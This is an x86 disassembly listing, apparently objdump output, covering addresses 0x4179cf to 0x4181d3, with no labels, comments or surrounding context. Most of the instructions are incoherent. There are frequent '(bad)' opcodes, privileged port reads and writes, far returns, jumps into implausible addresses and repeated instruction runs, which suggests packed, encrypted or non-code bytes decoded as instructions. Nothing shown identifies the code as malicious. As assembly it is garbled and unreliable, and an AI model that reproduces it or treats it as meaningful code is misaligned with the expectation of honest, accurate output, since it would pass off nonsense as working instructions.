  4179cf:	add    DWORD PTR [ebp+0x0],edx
  4179d2:	mov    esi,DWORD PTR [eax]
  4179d4:	mov    WORD PTR [ebx-0x7a750000],?
  4179da:	add    esi,DWORD PTR [ebp-0x78]
  4179dd:	mov    eax,DWORD PTR [eax]
  4179df:	cld    
  4179e0:	push   0x7d
  4179e2:	dec    DWORD PTR [ebx+0xd88c]
  4179e8:	push   edx
  4179e9:	mov    edx,DWORD PTR [ecx-0x4]
  4179ec:	call   DWORD PTR [eax+0x7d01fc]
  4179f2:	mov    ebx,edx
  4179f4:	cld    
  4179f5:	add    BYTE PTR [eax+0x560150],dl
  4179fb:	test   DWORD PTR [ebp+0x75],eax
  4179fe:	in     al,0x8b
  417a00:	in     al,dx
  417a01:	cld    
  417a02:	(bad)  
  417a03:	jge    0x417999
  417a05:	mov    esp,ebx
  417a07:	fsub   st,st(7)
  417a09:	add    bh,al
  417a0b:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  417a11:	add    edi,edi
  417a13:	add    bh,bh
  417a15:	mov    eax,0x50d800ed
  417a1a:	inc    ebp
  417a1b:	push   esi
  417a1c:	fisttp WORD PTR [ebx+0x4dc7f43f]
  417a22:	test   BYTE PTR [ebx],dh
  417a24:	fadd   DWORD PTR ds:0x4572c2
  417a2a:	jmp    0x4179ed
  417a2c:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  417a33:	inc    esi
  417a34:	jo     0x417a36
  417a36:	test   edi,eax
  417a38:	jmp    esp
  417a3a:	inc    DWORD PTR [eax]
  417a3c:	in     eax,dx
  417a3d:	add    al,bl
  417a3f:	jne    0x4179c6
  417a41:	mov    edi,edi
  417a43:	cld    
  417a44:	inc    DWORD PTR [ebp-0x12]
  417a47:	mov    esp,esp
  417a49:	mov    ah,0x85
  417a4b:	add    bh,bh
  417a4d:	call   0x119a351
  417a52:	ret    0x858b
  417a55:	cld    
  417a56:	inc    DWORD PTR [eax+0xe301ff]
  417a5c:	out    dx,al
  417a5d:	xor    BYTE PTR [ebp-0xff00cf],al
  417a63:	mov    ebx,ebp
  417a65:	cld    
  417a66:	jo     0x4179f1
  417a68:	or     DWORD PTR [ecx],eax
  417a6a:	add    BYTE PTR [eax],al
  417a6c:	push   eax
  417a6d:	add    DWORD PTR [ebp+0x45],eax
  417a70:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  417a76:	dec    DWORD PTR [ebx-0x3fda0318]
  417a7c:	add    BYTE PTR [ebp-0xbf0040],dl
  417a82:	inc    ebp
  417a83:	or     BYTE PTR [ebx-0x4faf0400],0x45
  417a8a:	add    DWORD PTR [ebx+0x459c00],ecx
  417a90:	mov    edi,edi
  417a92:	mov    eax,0xe80800ff
  417a97:	inc    ebp
  417a98:	sub    BYTE PTR [ebx-0x47000400],cl
  417a9e:	add    al,0x1
  417aa0:	rol    BYTE PTR [eax],0x1e
  417aa3:	jne    0x417aea
  417aa5:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  417aab:	inc    DWORD PTR [ecx]
  417aad:	call   0x86a2b2
  417ab2:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  417ab8:	call   0x41a2be
  417abd:	xor    bh,bh
  417abf:	push   edi
  417ac0:	adc    BYTE PTR [ebx-0x747423bb],al
  417ac6:	loopne 0x417aa4
  417ac8:	ret    
  417ac9:	loopne 0x417a67
  417acb:	xor    DWORD PTR [edx],0x31
  417ace:	cmp    edi,edi
  417ad0:	bswap  esp
  417ad2:	rol    BYTE PTR gs:[eax],0x5
  417ad6:	jmp    0x12c7c20
  417adb:	mov    eax,DWORD PTR [ebp-0x4]
  417ade:	add    BYTE PTR [eax+0xff0100],bh
  417ae4:	cld    
  417ae5:	jne    0x417b64
  417ae7:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  417aed:	push   ss
  417aee:	add    DWORD PTR [eax],eax
  417af0:	add    BYTE PTR [eax+0x7f],dl
  417af3:	inc    ebp
  417af4:	add    BYTE PTR [ebx+0x459850],cl
  417afa:	mov    edi,edi
  417afc:	test   al,0xff
  417afe:	add    BYTE PTR [eax],cl
  417b00:	inc    DWORD PTR [ebp-0x18]
  417b03:	jmp    DWORD PTR ds:0x4d7d00dc
  417b09:	adc    BYTE PTR [ebx+0x459cb9],cl
  417b0f:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  417b15:	pushf  
  417b16:	mov    eax,0x30132
  417b1b:	lea    esi,[ebp+0x2c]
  417b1e:	xor    edi,edi
  417b20:	(bad)  
  417b21:	call   0x140a28e
  417b26:	call   0x135a3b6
  417b2b:	jne    0x417ab8
  417b2d:	xor    edi,esp
  417b2f:	add    eax,DWORD PTR [eax+0xc018d]
  417b35:	push   DWORD PTR [eax]
  417b37:	call   0xcaa293
  417b3c:	int3   
  417b3d:	inc    DWORD PTR [ebp-0x14]
  417b40:	mov    ecx,DWORD PTR [ebp-0x28]
  417b43:	xor    eax,DWORD PTR [eax]
  417b45:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  417b4b:	(bad)  
  417b4c:	xchg   ebp,eax
  417b4d:	in     al,0xff
  417b4f:	add    bh,bh
  417b51:	add    BYTE PTR [ebp+0x45],dl
  417b54:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  417b5a:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  417b61:	mov    edi,edi
  417b63:	or     BYTE PTR [eax],cl
  417b65:	inc    ebp
  417b66:	test   DWORD PTR gs:[eax],eax
  417b69:	je     0x417bb0
  417b6b:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  417b71:	xor    edx,DWORD PTR [eax-0x73]
  417b74:	push   ebp
  417b75:	or     BYTE PTR [ebp+0x21007572],al
  417b7b:	inc    ebp
  417b7c:	in     al,dx
  417b7d:	mov    ebp,DWORD PTR [eax]
  417b7f:	mov    esp,0x648bc345
  417b84:	fmul   st,st(5)
  417b86:	add    BYTE PTR [ebx],ch
  417b88:	mov    eax,DWORD PTR [ebx]
  417b8a:	cld    
  417b8b:	loopne 0x417b4d
  417b8d:	inc    ebp
  417b8e:	push   ebp
  417b8f:	cmp    ebp,eax
  417b91:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  417b98:	cld    
  417b99:	fadd   DWORD PTR [eax+0x3b014d]
  417b9f:	jne    0x417bd1
  417ba1:	push   0xf8898557
  417ba6:	in     al,dx
  417ba7:	jne    0x417bee
  417ba9:	lea    eax,[ebx+0x72e8dcc8]
  417baf:	das    
  417bb0:	mov    eax,DWORD PTR [eax]
  417bb2:	mov    esp,0x33eb7545
  417bb7:	mov    edi,DWORD PTR [edi+0x4572bc]
  417bbd:	xor    eax,edi
  417bbf:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  417bc9:	rcl    BYTE PTR [eax-0x40],1
  417bcc:	inc    ebp
  417bcd:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  417bd5:	inc    ebp
  417bd6:	xchg   ebp,eax
  417bd7:	ud0    ebp,DWORD PTR [ebx]
  417bda:	inc    DWORD PTR [eax]
  417bdc:	retf   
  417bdd:	jbe    0x417bdf
  417bdf:	mov    dl,BYTE PTR [eax-0x80]
  417be2:	push   ebp
  417be3:	pop    ds
  417be4:	mov    ecx,DWORD PTR [esp+esi*8]
  417be7:	inc    eax
  417be8:	retf   
  417be9:	inc    ebp
  417bea:	iret   
  417beb:	jb     0x417bb5
  417bed:	mov    eax,DWORD PTR [edi]
  417bef:	enter  0x4545,0x1
  417bf3:	xor    DWORD PTR [eax],eax
  417bf5:	pushf  
  417bf6:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  417bfc:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  417c03:	dec    ebp
  417c04:	add    BYTE PTR [ebx],dh
  417c06:	inc    ebp
  417c07:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  417c0d:	xor    dl,BYTE PTR [edx]
  417c0f:	add    eax,DWORD PTR [ebp-0x77]
  417c12:	mov    eax,esp
  417c14:	fmul   DWORD PTR [ebp-0x3d]
  417c17:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  417c1e:	mov    DWORD PTR [ebp-0x28],eax
  417c21:	rol    DWORD PTR [ebp-0x64],1
  417c24:	xor    eax,edi
  417c26:	mov    ecx,0xff858db0
  417c2b:	clc    
  417c2c:	enter  0x4d45,0x32
  417c30:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  417c37:	test   esi,edi
  417c39:	clc    
  417c3a:	inc    DWORD PTR [ebp+0x45]
  417c3d:	cmp    al,0x8b
  417c3f:	pushf  
  417c40:	or     bh,al
  417c42:	enter  0x16a8,0x85
  417c46:	xor    eax,edi
  417c48:	pushf  
  417c49:	inc    ebp
  417c4a:	(bad)  
  417c4b:	ds cld 
  417c4d:	pushf  
  417c4e:	inc    ebp
  417c4f:	mov    edx,DWORD PTR [eax-0x28]
  417c52:	lock push ebp
  417c54:	add    BYTE PTR [ebx],dh
  417c56:	mov    DWORD PTR [ebx],eax
  417c58:	sar    BYTE PTR [ebx],1
  417c5a:	adc    BYTE PTR [edi],cl
  417c5c:	dec    ebp
  417c5d:	adc    al,0x8b
  417c5f:	add    al,dl
  417c61:	jmp    0x1027e31
  417c66:	jb     0x417cb5
  417c68:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  417c6e:	xor    ecx,DWORD PTR [ebp+0x3b]
  417c71:	xor    ecx,DWORD PTR [edi]
  417c73:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  417c77:	(bad)  
  417c79:	clc    
  417c7a:	enter  0x8400,0x8b
  417c7e:	pop    es
  417c7f:	mov    al,0x0
  417c81:	push   ebp
  417c82:	push   cs
  417c83:	xor    ecx,eax
  417c85:	xor    esp,ecx
  417c87:	add    ebp,DWORD PTR [eax]
  417c89:	add    esi,DWORD PTR [eax]
  417c8b:	(bad)  
  417c8d:	retf   0x55c8
  417c90:	repnz mov eax,DWORD PTR [ebp-0x10]
  417c94:	(bad)  
  417c95:	cli    
  417c96:	fdivr  st,st(1)
  417c98:	test   DWORD PTR [eax+edi*8],ecx
  417c9b:	dec    ebp
  417c9c:	inc    ebp
  417c9d:	xor    edi,DWORD PTR [eax-0x7167afd]
  417ca3:	add    BYTE PTR [ebp+0x0],al
  417ca6:	mov    ecx,DWORD PTR [ebp-0x28]
  417ca9:	mov    ecx,ebx
  417cab:	clc    
  417cac:	jne    0x417c79
  417cae:	mov    esi,0xd672d3
  417cb3:	into   
  417cb4:	into   
  417cb5:	scas   eax,DWORD PTR es:[edi]
  417cb6:	dec    ebp
  417cb7:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  417cbd:	sub    ecx,esi
  417cbf:	cmp    ecx,DWORD PTR [ebp+0x77]
  417cc2:	(bad)  
  417cc3:	mov    edi,eax
  417cc5:	mov    al,0x85
  417cc7:	mov    eax,edi
  417cc9:	add    BYTE PTR [ebp-0x75],al
  417ccc:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  417cd3:	xor    eax,DWORD PTR [ebp+0x4503f803]
  417cd9:	(bad)  
  417cdb:	retf   0x559c
  417cde:	(bad)  
  417cdf:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  417ce6:	inc    ebp
  417ce7:	add    eax,0xeb9c4d3f
  417cec:	(bad)  
  417ced:	mov    ecx,esp
  417cef:	lods   al,BYTE PTR ds:[esi]
  417cf0:	test   DWORD PTR [ebp-0x8],edx
  417cf3:	xor    ecx,DWORD PTR [ebp+0x33]
  417cf6:	mov    eax,DWORD PTR [ebx]
  417cf8:	lock add ecx,ebx
  417cfb:	bswap  esi
  417cfd:	retf   0x55d1
  417d00:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  417d06:	jmp    0x417d01
  417d08:	add    BYTE PTR ds:0xebc44d8b,al
  417d0e:	push   ebp
  417d0f:	mov    ebp,DWORD PTR [ebx]
  417d11:	test   al,0x8b
  417d13:	push   ebp
  417d14:	clc    
  417d15:	xor    ecx,ebx
  417d17:	xor    ecx,esi
  417d19:	add    edx,ecx
  417d1b:	add    eax,DWORD PTR [edx+0xca010f]
  417d21:	push   ebp
  417d22:	dec    ebp
  417d23:	mov    ecx,DWORD PTR [ebx-0x34050710]
  417d29:	stc    
  417d2a:	rol    DWORD PTR ds:0xebce4dd6,cl
  417d30:	scas   eax,DWORD PTR es:[edi]
  417d31:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  417d37:	xor    ebp,DWORD PTR [ebx]
  417d39:	xor    edi,DWORD PTR [ebx]
  417d3b:	add    esi,DWORD PTR [edi+0x3]
  417d3e:	mov    ecx,DWORD PTR [edi]
  417d40:	clc    
  417d41:	retf   0x55cb
  417d44:	into   
  417d45:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  417d4c:	mov    eax,0x3376554d
  417d51:	mov    esi,DWORD PTR [ebx]
  417d53:	int3   
  417d54:	add    edx,DWORD PTR [ebp+0x3]
  417d57:	xor    ecx,DWORD PTR [edi]
  417d59:	xor    ecx,edx
  417d5b:	add    edx,DWORD PTR [ebp+0x3]
  417d5e:	mov    ecx,DWORD PTR [edi]
  417d60:	lock retf 0x4dfa
  417d64:	stc    
  417d65:	mov    ecx,DWORD PTR [eax]
  417d67:	or     BYTE PTR [ebp+0x4d],cl
  417d6a:	jmp    0x1057dfa
  417d6f:	dec    ebp
  417d70:	dec    ebp
  417d71:	(bad)  
  417d72:	mov    ebx,esp
  417d74:	clc    
  417d75:	test   ebx,ecx
  417d77:	clc    
  417d78:	ror    DWORD PTR [ebp-0x2a],cl
  417d7b:	mov    esi,ecx
  417d7d:	call   0x33ccc331
  417d82:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  417d89:	retf   
  417d8a:	ja     0x417d5a
  417d8c:	mov    ebp,DWORD PTR [eax-0x48]
  417d8f:	dec    ebp
  417d90:	xor    ecx,DWORD PTR [di+0x3]
  417d94:	mov    esp,esp
  417d96:	clc    
  417d97:	push   ebp
  417d98:	retf   
  417d99:	mov    dl,bl
  417d9b:	adc    esi,edx
  417d9d:	jb     0x417d6d
  417d9f:	add    BYTE PTR [edi-0x3b7474b3],ch
  417da5:	call   0x4d6d4927
  417daa:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  417db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db1:	pushf  
  417db2:	inc    ebp
  417db3:	xor    cl,BYTE PTR [ebp-0x78]
  417db6:	mov    edx,edi
  417db8:	clc    
  417db9:	dec    ebp
  417dba:	retf   
  417dbb:	mov    edx,ebx
  417dbd:	call   0x56105198
  417dc2:	scas   eax,DWORD PTR es:[edi]
  417dc3:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  417dc9:	pushf  
  417dca:	sub    esi,DWORD PTR [edx]
  417dcc:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  417dd2:	lods   al,BYTE PTR ds:[esi]
  417dd3:	xor    esp,DWORD PTR [ebx]
  417dd5:	add    ecx,DWORD PTR [ebp-0x1c]
  417dd8:	mov    edi,DWORD PTR [ebp-0x8]
  417ddb:	mov    bl,cl
  417ddd:	cmp    dl,bl
  417ddf:	jb     0x417daf
  417de1:	add    dh,dl
  417de3:	dec    ebp
  417de4:	scas   eax,DWORD PTR es:[edi]
  417de5:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  417deb:	shr    DWORD PTR [ebx],cl
  417ded:	into   
  417dee:	cmp    edx,esi
  417df0:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  417df6:	dec    ebp
  417df7:	dec    ebp
  417df8:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  417dfe:	retf   
  417dff:	xor    edx,esi
  417e01:	add    ecx,esi
  417e03:	imul   ecx,edx
  417e06:	mov    DWORD PTR [ebp+0x8],edx
  417e09:	xor    ecx,DWORD PTR [ebp+0x2b]
  417e0c:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  417e12:	add    esi,DWORD PTR [ebx]
  417e14:	mov    ah,0x3
  417e16:	inc    ebp
  417e17:	rdtsc  
  417e19:	xlat   BYTE PTR ds:[ebx]
  417e1a:	pushf  
  417e1b:	jge    0x417da6
  417e1d:	xor    ebx,eax
  417e1f:	sub    eax,DWORD PTR [ebp-0x73]
  417e22:	(bad)  
  417e23:	cmp    al,al
  417e25:	jb     0x417dac
  417e27:	add    al,bh
  417e29:	ror    DWORD PTR [ebp-0x7a],1
  417e2c:	xor    edi,edi
  417e2e:	add    edi,edi
  417e30:	jmp    0x417e7f
  417e32:	mov    ecx,DWORD PTR [ebx-0x34341324]
  417e38:	dec    ebp
  417e39:	into   
  417e3a:	mov    ebp,DWORD PTR [edi-0x23737428]
  417e40:	pushf  
  417e41:	shl    DWORD PTR [edx],cl
  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
